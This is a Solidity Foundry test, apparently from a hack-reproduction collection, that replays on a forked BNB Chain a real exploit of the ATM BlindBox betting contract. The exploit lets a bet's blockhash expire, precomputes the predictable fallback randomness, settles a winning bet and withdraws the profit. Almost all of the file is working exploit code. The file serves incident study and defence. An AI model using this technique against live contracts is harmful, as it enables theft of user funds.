// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 13,000,000 ATM (~99,000 USD)
// Attacker : 0x3f9Bd963641e969Fc0c9Ddf1c67e210e84915b7D
// Attack Contract : 0x9C1819640201f223596FaD4F6401900B4B732eeA
// Vulnerable Contract : 0x1F8336aEF584795E282FECe8DE356BaBD7734c59
// Victim : 0x1F8336aEF584795E282FECe8DE356BaBD7734c59
// Attack Tx : https://bscscan.com/tx/0xb74a572967ce997afa5920811e6a9dc8b82a6e41ee31fa4d1a24a85aec89e342

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x1F8336aEF584795E282FECe8DE356BaBD7734c59#code

// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/2808
//
// ATM BlindBox let users choose when to settle bets. After blockhash(betBlock + 2) expired,
// settlement fell back to keccak256(block.prevrandao, betId, block.timestamp), which the
// attacker could evaluate before submitting a winning settlement.

address constant ATTACKER = 0x3f9Bd963641e969Fc0c9Ddf1c67e210e84915b7D;
address constant HISTORICAL_ATTACK_CONTRACT = 0x9C1819640201f223596FaD4F6401900B4B732eeA;
address constant BLINDBOX = 0x1F8336aEF584795E282FECe8DE356BaBD7734c59;
address constant ATM_TOKEN = 0x9C86F45905868317baCB8f442653d5E9a6888888;
address constant DEAD = 0x000000000000000000000000000000000000dEaD;

interface IBlindBox {
    function nextBetId() external view returns (uint256);
    function cachedBlockHash(
        uint256 blockNumber
    ) external view returns (bytes32);
    function bets(
        uint256 betId
    ) external view returns (address user, uint256 amount, uint256 blockNum, uint256 oddDigit, bool settled);
    function settle(
        uint256 betId
    ) external;
}

contract ContractTest is BaseTestWithBalanceLog {
    IERC20 private constant atm = IERC20(ATM_TOKEN);
    IBlindBox private constant blindBox = IBlindBox(BLINDBOX);

    function setUp() public {
        uint256 forkBlock = 87_517_071;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = ATM_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack helper");
        vm.label(BLINDBOX, "ATM BlindBox");
        vm.label(ATM_TOKEN, "ATM");
        vm.label(DEAD, "ATM DEAD payout pool");
    }

    function testExploit() public balanceLog {
        ATMBlindBoxHelper helper = new ATMBlindBoxHelper(ATTACKER);

        // step 1: give the local helper the same large-bet capital as the delayed placement tx.
        uint256 largeBetAmount = 300_000 ether;
        deal(ATM_TOKEN, address(helper), largeBetAmount);
        assertGt(atm.balanceOf(DEAD), (largeBetAmount * 195) / 100, "DEAD payout balance");

        // step 2: place an even-parity large bet in the same block as the historical placement.
        vm.roll(87_517_072);
        vm.warp(1_773_931_227);
        uint256 expectedBetId = blindBox.nextBetId();
        assertEq(expectedBetId, 0x1410, "historical delayed bet id");

        vm.prank(ATTACKER, ATTACKER);
        helper.placeLargeBet(largeBetAmount);

        (, uint256 recordedAmount, uint256 betBlock, uint256 parity, bool settledBefore) = blindBox.bets(expectedBetId);
        assertEq(recordedAmount, largeBetAmount, "recorded bet amount");
        assertEq(betBlock, block.number, "recorded bet block");
        assertEq(parity, 0, "even parity");
        assertFalse(settledBefore, "bet should be open");

        // step 3: settle after the target blockhash has expired, using the actual winning fallback inputs.
        uint256 targetBlock = betBlock + 2;
        vm.roll(87_517_892);
        vm.warp(1_773_931_596);
        vm.prevrandao(bytes32(uint256(0x12c)));
        assertEq(block.number - targetBlock, 818, "target block age");
        assertEq(blockhash(targetBlock), bytes32(0), "expired target blockhash");

        bytes32 fallbackHash = keccak256(abi.encodePacked(block.prevrandao, expectedBetId, block.timestamp));
        assertEq(uint256(fallbackHash) % 16, 2, "winning even fallback digit");

        uint256 helperBeforeSettle = atm.balanceOf(address(helper));
        vm.prank(ATTACKER, ATTACKER);
        helper.settleBet(expectedBetId);

        uint256 largeBetPayout = (largeBetAmount * 195) / 100;
        assertEq(atm.balanceOf(address(helper)) - helperBeforeSettle, largeBetPayout, "large bet payout");
        assertEq(blindBox.cachedBlockHash(targetBlock), fallbackHash, "cached fallback hash");

        // step 4: forward the gained ATM to the attacker and assert net round profit over the staked ATM.
        uint256 attackerBeforeWithdraw = atm.balanceOf(ATTACKER);
        vm.prank(ATTACKER, ATTACKER);
        helper.withdrawATM();
        uint256 attackerReceived = atm.balanceOf(ATTACKER) - attackerBeforeWithdraw;
        assertGt(attackerReceived - largeBetAmount, 280_000 ether, "net ATM profit");
    }
}

contract ATMBlindBoxHelper {
    address private immutable owner;
    IERC20 private constant atm = IERC20(ATM_TOKEN);
    IBlindBox private constant blindBox = IBlindBox(BLINDBOX);

    constructor(
        address owner_
    ) {
        owner = owner_;
    }

    function placeLargeBet(
        uint256 amount
    ) external {
        require(msg.sender == owner, "only owner");
        atm.transfer(DEAD, amount);
    }

    function settleBet(
        uint256 betId
    ) external {
        require(msg.sender == owner, "only owner");
        blindBox.settle(betId);
    }

    function withdrawATM() external {
        require(msg.sender == owner, "only owner");
        atm.transfer(owner, atm.balanceOf(address(this)));
    }
}
